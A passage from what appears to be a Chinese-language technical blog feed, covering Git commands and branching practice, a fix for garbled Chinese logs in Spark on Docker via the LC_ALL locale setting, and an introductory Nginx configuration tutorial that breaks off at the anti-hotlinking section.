<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化工作区</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交文件到版本库</span></span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本地仓库与远程仓库关联（先在github创建仓库）</span></span><br><span class="line">git remote add origin git@github.com:hujinbo/test.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取最新代码</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程仓库</span></span><br><span class="line">git push -u origin master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看仓库状态</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回滚到某次提交</span></span><br><span class="line">git reset --hard 32580c6d77ce7a85f07b9a1ba620a46fa4830f5e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆仓库到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:hujinbo/test.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加子模块</span></span><br><span class="line">git submodule add git@github.com:hujinbo/hexo-theme-next.git themes/next</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归克隆（包含子模块）</span></span><br><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:hujinbo/hujinbo.github.io.git</span><br></pre></td></tr></table></figure>
<h2 id="标签管理">标签管理</h2>
<p>用于标记发布的版本，可以迅速回滚到某个标签状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有标签</span></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建标签</span></span><br><span class="line">git tag v1.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定提交信息</span></span><br><span class="line">git tag -a v1.0.0 -m <span class="string">&quot;v1版本&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标签发布</span></span><br><span class="line">git push origin v1.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除标签</span></span><br><span class="line">git tag -d v1.0.0</span><br><span class="line">git push origin :refs/tags/v1.0.0</span><br></pre></td></tr></table></figure>
<h2 id="分支管理">分支管理</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建分支</span></span><br><span class="line">git branch feature_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看分支</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换分支</span></span><br><span class="line">git checkout feature_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并分支（将feature_1合并到master，需先切换到master）</span></span><br><span class="line">git merge feature_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line">git branch -d feature_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有分支操作记录</span></span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure>
<h2 id="最佳实践">最佳实践</h2>
<p>master分支存储正式发布的历史 develop分支作为功能收集的分支 feature分支作为功能分支，每个新功能都有一个自己的分支，使用develop分支作为父分支，当功能完成时，合并回develop release分支使用develop分支作为父分支，只应该做bug修复、文档生成和其他面向发布的任务。当bug修复完且稳定，应合并到develop和master并分配一个版本号并打上标签 hotfix分支，唯一可以从master分支fork出来的分支，修复完成应马上合并回master分支和develop分支，master分支应用新的版本号打tag</p>
<p><img data-src="https://img.hujinbo.me/blog/20200109003136.png" /></p>
<p>建议开发feature，经常从develop同步过来</p>
<ol type="1">
<li>提交前diff自己提交的代码，避免提交无用的文件。</li>
<li>提交代码注释规范，</li>
<li>使用独立分支开发，</li>
<li>搞清冲突原因，不要随意丢弃别人的代码</li>
<li>产品发布后，记得打tag，方便将来拉分支修bug</li>
<li>版本号规范，稳定版发布前v0.1，v0.2 第一个稳定的版本v1.0</li>
</ol>
<h2 id="可视化工具">可视化工具</h2>
<p>SourceTree</p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark在Docker环境下中文乱码问题</title>
    <url>/posts/56475/</url>
    <content><![CDATA[<blockquote>
<p>具体表现为：日志的中文字符变为<code>???</code>符号，启动Spark History Server时报错：java.nio.charset.MalformedInputException: Input length = 1</p>
</blockquote>
<h2 id="解决方式">解决方式</h2>
<p>添加环境变量<code>LC_ALL=en_US.UTF-8</code>，如下示例为k8s的yaml配置方式： <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">spark</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;swr.cn-north-1.myhuaweicloud.com/nascent/spark-quantbi:spark_3.0_0914_3&quot;</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">TZ</span></span><br><span class="line">        <span class="attr">value:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">LC_ALL</span></span><br><span class="line">        <span class="attr">value:</span> <span class="string">en_US.UTF-8</span></span><br></pre></td></tr></table></figure></p>
<h2 id="问题描述">问题描述</h2>
<p>公司有两套Spark环境，一套使用本地部署，一套使用Docker部署，在日常使用中，通常包含很多中文字段的日志打印。<br />
在本地部署的环境中文日志显示正常，而一但通过Docker打包发布后，就出现中文乱码了。<br />
在开启Spark History Server后，包含中文的Application更是直接报错，影响正常使用。 <span id="more"></span> 1. 使用Spark UI查看日志，发现中文全部乱码，变为<code>?</code>符号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20/09/15 09:14:35.849 CST main WARN org.apache.spark.sql.execution.datasources.jdbc.JdbcUtils: Create Table Sql: [CREATE TABLE snappy_2fb345e26060499e8ec47b4f9d96d1fe (`??` bigint , `??` integer , `????` datetime , `????` datetime )]</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>开启Spark History Server后，只要ETL包含中文，解析就会报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20/09/15 09:57:19.450 CST worker-cleanup-thread INFO org.apache.spark.deploy.worker.Worker: Cleaning up local directories for application app-20200915095627-0016</span><br><span class="line">20/09/15 09:57:21.388 CST log-replay-executor-3 INFO org.apache.spark.deploy.history.FsHistoryProvider: Parsing file:/opt/tmp/spark-events/eventlog_v2_app-20200915095627-0016 for listing data...</span><br><span class="line">20/09/15 09:57:21.392 CST log-replay-executor-3 ERROR org.apache.spark.deploy.history.FsHistoryProvider: Exception while merging application listings</span><br><span class="line">java.nio.charset.MalformedInputException: Input length = 1</span><br><span class="line">    at java.nio.charset.CoderResult.throwException(CoderResult.java:281)</span><br><span class="line">    at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:339)</span><br><span class="line">    at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)</span><br><span class="line">    at java.io.InputStreamReader.read(InputStreamReader.java:184)</span><br><span class="line">    at java.io.BufferedReader.fill(BufferedReader.java:161)</span><br><span class="line">    at java.io.BufferedReader.readLine(BufferedReader.java:324)</span><br><span class="line">    at java.io.BufferedReader.readLine(BufferedReader.java:389)</span><br><span class="line">    at scala.io.BufferedSource$BufferedLineIterator.hasNext(BufferedSource.scala:74)</span><br><span class="line">    at scala.collection.Iterator$$anon$20.hasNext(Iterator.scala:884)</span><br><span class="line">    at scala.collection.Iterator$$anon$12.hasNext(Iterator.scala:511)</span><br><span class="line">    at org.apache.spark.scheduler.ReplayListenerBus.replay(ReplayListenerBus.scala:82)</span><br><span class="line">    at org.apache.spark.deploy.history.FsHistoryProvider.$anonfun$doMergeApplicationListing$4(FsHistoryProvider.scala:777)</span><br><span class="line">    at org.apache.spark.deploy.history.FsHistoryProvider.$anonfun$doMergeApplicationListing$4$adapted(FsHistoryProvider.scala:759)</span><br><span class="line">    at org.apache.spark.util.Utils$.tryWithResource(Utils.scala:2539)</span><br><span class="line">    at org.apache.spark.deploy.history.FsHistoryProvider.doMergeApplicationListing(FsHistoryProvider.scala:759)</span><br><span class="line">    at org.apache.spark.deploy.history.FsHistoryProvider.mergeApplicationListing(FsHistoryProvider.scala:675)</span><br><span class="line">    at org.apache.spark.deploy.history.FsHistoryProvider.$anonfun$checkForLogs$13(FsHistoryProvider.scala:545)</span><br><span class="line">    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)</span><br><span class="line">    at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)</span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)</span><br><span class="line">    at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure> 不包含中文则可以正常解析： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20/09/15 09:58:33.352 CST worker-cleanup-thread INFO org.apache.spark.deploy.worker.Worker: Cleaning up local directories for application app-20200915095822-0017</span><br><span class="line">20/09/15 09:58:41.403 CST log-replay-executor-0 INFO org.apache.spark.deploy.history.FsHistoryProvider: Parsing file:/opt/tmp/spark-events/eventlog_v2_app-20200915095822-0017 for listing data...</span><br><span class="line">20/09/15 09:58:41.407 CST log-replay-executor-0 INFO org.apache.spark.deploy.history.FsHistoryProvider: Finished parsing file:/opt/tmp/spark-events/eventlog_v2_app-20200915095822-0017</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="排查过程">排查过程</h2>
<ol type="1">
<li><p>根据错误堆栈，找到读取日志文件的代码： <img data-src="https://img.hujinbo.me/blog/sCC78J.png" /></p></li>
<li><p>查看<code>Source.fromInputStream</code>源码，可以看到默认使用<code>Codec.default</code>的编码： <img data-src="https://img.hujinbo.me/blog/JATmVQ.png" /></p></li>
<li><p>查看<code>Codec.default</code>源码，可以看到默认使用的是<code>Charset.defaultCharset</code>的编码： <img data-src="https://img.hujinbo.me/blog/zL1c8w.png" /></p></li>
<li><p>而<code>Charset.defaultCharset</code>读取的是<code>file.encoding</code>的值： <img data-src="https://img.hujinbo.me/blog/oXiqJh.png" /></p></li>
<li><p>关闭Spark History Server日志压缩，下载日志文件，发现文件编码为<code>UTF-8</code>且中文写入正常，故日志写入方面没有问题： <img data-src="https://img.hujinbo.me/blog/rZjyfq.png" /></p></li>
<li><p>通过Spark UI查看Spark系统环境变量，发现编码为<code>ANSI_X3.4-1968</code>，可能是使用该编码读取文件时引发报错: <img data-src="https://img.hujinbo.me/blog/344l9I.png" /></p></li>
<li><p>为验证上述猜想，编写测试用例，使用<code>Source</code>读取日志文件，并指定编码为<code>ANSI_X3.4-1968</code>，可以复现Spark History Server的报错： <img data-src="https://img.hujinbo.me/blog/H4PEMv.png" /></p></li>
<li><p>而指定编码为<code>UTF-8</code>时，文件读取正常。所以，只需让读取到的<code>file.encoding</code>为<code>UTF-8</code>即可解决乱码和报错的问题。 <img data-src="https://img.hujinbo.me/blog/Al1A1v.png" /></p></li>
<li><p>而日志打印中文乱码问题，是因为磁盘只能存储二进制文件，故Java程序在写文件时会调用<code>String.getByte</code>方法将对象转为byte，然后再写入磁盘。 查看相关源码，发现它使用的编码也是上面提到的<code>Charset.defaultCharset</code>系统默认编码。 <img data-src="https://img.hujinbo.me/blog/xmTpZV.png" /></p></li>
<li><p>所以上述2个问题，都是由于Docker环境下未指定系统默认字符集为<code>UTF-8</code>，导致读取<code>file.encoding</code>为<code>ANSI_X3.4-1968</code>所引发的。</p></li>
</ol>
<h2 id="注意事项">注意事项</h2>
<p>在排查过程中，进入容器后，使用<code>locale</code>命令或启动<code>spark-shell</code>执行<code>println(Charset.defaultCharset)</code>检查编码均正常，故不能使用这2种方法判断。<br />
除了上述Spark UI查看<code>file.encoding</code>的方式，也可以使用Arthas诊断工具的<code>sysprop</code>命令进行查看当前JVM的<code>file.encoding</code>属性。 <img data-src="https://img.hujinbo.me/blog/IHFjQC.png" /></p>
]]></content>
      <categories>
        <category>Spark</category>
      </categories>
      <tags>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx入门到实践</title>
    <url>/posts/64148/</url>
    <content><![CDATA[<blockquote>
<p>Nginx是一款轻量级、高性能的HTTP和反向代理服务器，同时也提供了邮件代理服务和通用的TCP/UDP代理服务。</p>
</blockquote>
<h2 id="环境搭建">环境搭建</h2>
<ol type="1">
<li><p>安装依赖工具</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure></p></li>
<li><p>设置yum仓库，创建文件<code>/etc/yum.repos.d/nginx.repo</code></p>
<p><figure class="highlight bash"><figcaption><span>nginx.repo</span></figcaption><table><tr><td class="code"><pre><span class="line">[nginx-stable]</span><br><span class="line">name=nginx stable repo</span><br><span class="line">baseurl=http://nginx.org/packages/centos/<span class="variable">$releasever</span>/<span class="variable">$basearch</span>/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://nginx.org/keys/nginx_signing.key</span><br><span class="line">module_hotfixes=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[nginx-mainline]</span><br><span class="line">name=nginx mainline repo</span><br><span class="line">baseurl=http://nginx.org/packages/mainline/centos/<span class="variable">$releasever</span>/<span class="variable">$basearch</span>/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=https://nginx.org/keys/nginx_signing.key</span><br><span class="line">module_hotfixes=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<span id="more"></span>
<ol start="3" type="1">
<li><p>安装Nginx</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y nginx</span><br></pre></td></tr></table></figure></p></li>
<li><p>安装成功，查看版本号</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure></p></li>
<li><p>常用命令</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动nginx</span></span><br><span class="line">systemctl start nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭nginx</span></span><br><span class="line">systemctl stop nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启nginx</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nginx安装目录</span></span><br><span class="line">rpm -ql nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看环境参数</span></span><br><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置语法是否正确</span></span><br><span class="line">nginx -t -c /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重载配置文件</span></span><br><span class="line">nginx -s reload -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="配置文件">配置文件</h2>
<p>Nginx总配置文件，路径<code>/etc/nginx/nginx.conf</code>，以下是配置参数说明：</p>
<figure class="highlight plaintext"><figcaption><span>nginx.conf</span></figcaption><table><tr><td class="code"><pre><span class="line"># 设置Nginx运行的用户</span><br><span class="line">user  nginx;</span><br><span class="line"># 工作进程数（一般和cpu核数相同，如：8核16线程，设置16个）</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line"># 错误日志存放路径和类型</span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line"># 进程pid存放路径</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"># 一个Nginx进程最大打开文件数（建议值：小站点1万，大站点2-3万）</span><br><span class="line">worker_rlimit_nofile 10240;</span><br><span class="line"></span><br><span class="line"># 事件模块</span><br><span class="line">events &#123;</span><br><span class="line">    # 单个进程允许的最大连接数（一般1万）</span><br><span class="line">    worker_connections  10240;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 配置http服务器</span><br><span class="line">http &#123;</span><br><span class="line">    # 设置http的Content-Type与文件扩展名映射关系</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    # 默认文件类型</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    # 默认字符集</span><br><span class="line">    charset utf-8;</span><br><span class="line">    </span><br><span class="line">    # 日志格式</span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    # 访问日志存放路径和类型</span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    # 开启零拷贝传输模式，文件传输只通过内核空间传递给socket</span><br><span class="line">    sendfile        on;</span><br><span class="line">    # 开启sendfile时，可提高网络包的传输效率，适用于大文件场景</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    # 客户端跟服务端超时时间</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    # 开启gzip压缩</span><br><span class="line">    gzip  on;</span><br><span class="line">    # 关闭IE1-6的gzip</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line"></span><br><span class="line">    # 引入子配置文件，/etc/nginx/conf.d/下所有以conf结尾的文件</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nginx默认配置文件，在<code>nginx.conf</code>被引用，路径<code>/etc/nginx/conf.d/default.conf</code>，以下是配置参数说明：</p>
<figure class="highlight plaintext"><figcaption><span>default.conf</span></figcaption><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 监听端口</span><br><span class="line">    listen       80;</span><br><span class="line">    # 配置主机名或域名</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    # 默认访问路径的位置，访问首页路径或子路径都会进入</span><br><span class="line">    location / &#123;</span><br><span class="line">        # 页面路径</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        # 默认访问的页面文件，若第一个不存在，则访问第二个</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 404错误页面</span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    # 统一定义错误页面，如下表示50x.html存放在/usr/share/nginx/html</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">    # concurs with nginx&#x27;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="日志格式">日志格式</h2>
<ol type="1">
<li><p>HTTP请求变量 arg_PARAMETER : http请求参数 http_HEADER : http请求头部，HEADER转为小写，横线转为下划线 sent_http_HEADER : http响应头部</p></li>
<li><p>Nginx内置变量，请参阅<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfY29yZV9tb2R1bGUuaHRtbCN2YXJfc3RhdHVz">官方文档<i class="fa fa-external-link-alt"></i></span></p></li>
</ol>
<h2 id="location语法">location语法</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">符号</th>
<th style="text-align: left;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">=</td>
<td style="text-align: left;">精确匹配，优先级高，匹配上就不会往下继续匹配</td>
</tr>
<tr class="even">
<td style="text-align: center;">^~</td>
<td style="text-align: left;">前缀匹配，以...开头，优先级高，匹配上就不会往下继续匹配</td>
</tr>
<tr class="odd">
<td style="text-align: center;">~</td>
<td style="text-align: left;">区分大小写的正则匹配，匹配到后将继续匹配，若遇到优先级高的，则采用优先级高的。</td>
</tr>
<tr class="even">
<td style="text-align: center;">~*</td>
<td style="text-align: left;">不区分大小的正则匹配，匹配规则同上</td>
</tr>
<tr class="odd">
<td style="text-align: center;">/</td>
<td style="text-align: left;">通用匹配，任何请求都会匹配到</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location = /post/ &#123;</span><br><span class="line">    rewrite ^(.*)$ /post/index.html <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ /post.* &#123;</span><br><span class="line">    rewrite ^(.*)$ /post/index.html <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ^~ /post &#123;</span><br><span class="line">    rewrite ^(.*)$ /post/index.html <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="try_files语法">try_files语法</h2>
<p>按顺序检查文件是否存在，返回第一个找到的文件或文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先检查uri是否存在，存在则返回，不存在则访问uri/</span></span><br><span class="line"><span class="comment"># 该路径下如果无文件返回，则重定向到/index.html</span></span><br><span class="line">location / &#123;</span><br><span class="line">    try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="root和alias">root和alias</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访问https://hujinbo.me/req_path/img/cat.png =&gt; /local_path/img/req_path/img/cat.png</span></span><br><span class="line">location /req_path/img/ &#123;</span><br><span class="line">   root /local_path/img/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问https://hujinbo.me/req_path/img/cat.png =&gt; /local_path/img/cat.png</span></span><br><span class="line">location /req_path/img/ &#123;</span><br><span class="line">   <span class="built_in">alias</span> /local_path/img/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="常用模块">常用模块</h2>
<h3 id="rewrite规则">Rewrite规则</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfcmV3cml0ZV9tb2R1bGUuaHRtbA==">ngx_http_rewrite_module<i class="fa fa-external-link-alt"></i></span> 作用：用于伪静态、SEO优化、页面跳转（所有的请求都跳转维护页面）、版本升级兼容等。</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Syntax:   rewrite regex replacement [flag];</span><br><span class="line">Default:  —</span><br><span class="line">Context:  server, location, <span class="keyword">if</span></span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">regex</th>
<th style="text-align: left;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">\</td>
<td style="text-align: left;">转义字符</td>
</tr>
<tr class="even">
<td style="text-align: left;">^</td>
<td style="text-align: left;">匹配字符串的开始位置</td>
</tr>
<tr class="odd">
<td style="text-align: left;">$</td>
<td style="text-align: left;">匹配字符串的结尾位置</td>
</tr>
<tr class="even">
<td style="text-align: left;">.</td>
<td style="text-align: left;">匹配除换行符<code>\n</code>之外的任何单字符</td>
</tr>
<tr class="odd">
<td style="text-align: left;">?</td>
<td style="text-align: left;">匹配前面的子表达式0次或1次</td>
</tr>
<tr class="even">
<td style="text-align: left;">*</td>
<td style="text-align: left;">匹配前面的子表达式0次或多次</td>
</tr>
<tr class="odd">
<td style="text-align: left;">+</td>
<td style="text-align: left;">匹配前面的子表达式1次或多次</td>
</tr>
<tr class="even">
<td style="text-align: left;">{n}</td>
<td style="text-align: left;">匹配确定的n次</td>
</tr>
<tr class="odd">
<td style="text-align: left;">{n,}</td>
<td style="text-align: left;">匹配n次或多次</td>
</tr>
<tr class="even">
<td style="text-align: left;"> 匹配一个数字字符</td>
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">[c]</td>
<td style="text-align: left;">匹配单个字符<code>c</code></td>
</tr>
<tr class="even">
<td style="text-align: left;">[a-z]</td>
<td style="text-align: left;">匹配<code>a-z</code>中的任意小写字母字符</td>
</tr>
<tr class="odd">
<td style="text-align: left;">( )</td>
<td style="text-align: left;">用于匹配括号之间的内容，通过$1、$2调用</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">flag</th>
<th style="text-align: left;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">last</td>
<td style="text-align: left;">停止rewrite检测，会重新建立1次请求</td>
</tr>
<tr class="even">
<td style="text-align: left;">break</td>
<td style="text-align: left;">停止rewrite检测，不会继续匹配后面的location</td>
</tr>
<tr class="odd">
<td style="text-align: left;">redirect</td>
<td style="text-align: left;">返回302临时重定向，客户端2次请求，地址栏变化</td>
</tr>
<tr class="even">
<td style="text-align: left;">permanent</td>
<td style="text-align: left;">返回301永久重定向，地址栏变化，客户端会缓存重定向结果</td>
</tr>
</tbody>
</table>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    <span class="comment"># 将url参数转为路径</span></span><br><span class="line">    rewrite ^/post-(\d+)-(\d+)-(\d+)\.html$ /course/<span class="variable">$1</span>/<span class="variable">$2</span>/post_<span class="variable">$3</span>.html <span class="built_in">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~* Chrome) &#123;</span><br><span class="line">        rewrite ^/nginx http://hujinbo.me/index.html redirect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!-f <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://www.baidu.com/<span class="variable">$1</span> redirect;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$http_user_agent</span> ~ MSIE) &#123;</span><br><span class="line">        rewrite ^(.*)$ /msie/<span class="variable">$1</span> <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    index  index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="缓存跨域">缓存/跨域</h3>
<p>模块：<span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfaGVhZGVyc19tb2R1bGUuaHRtbA==">ngx_http_headers_module<i class="fa fa-external-link-alt"></i></span> 作用：在响应头添加Cache-Control和Expires，或自定义的字段</p>
<p>语法： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 缓存时间设置</span></span><br><span class="line">Syntax:   expires [modified] time;</span><br><span class="line">          expires epoch | max | off;</span><br><span class="line">Default:  expires off;</span><br><span class="line">Context:  http, server, location, <span class="keyword">if</span> <span class="keyword">in</span> location</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加响应头部</span></span><br><span class="line">Syntax:   add_header name value [always];</span><br><span class="line">Default:  —</span><br><span class="line">Context:  http, server, location, <span class="keyword">if</span> <span class="keyword">in</span> location</span><br></pre></td></tr></table></figure></p>
<p>示例： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ .*\.(htm|html)$ &#123;</span><br><span class="line">    <span class="comment"># 配置缓存时间</span></span><br><span class="line">    expires 24h;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 配置跨域访问</span></span><br><span class="line">    add_header Access-Control-Allow-Origin *; </span><br><span class="line">    add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>注：</strong> 浏览器缓存规则，可以参考文章<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemhvdXdlbmhvbmcvcC8zOTI4NjQ1Lmh0bWw=">Expires、Last-Modified、Etag缓存控制<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="防盗链">防盗链</h3>
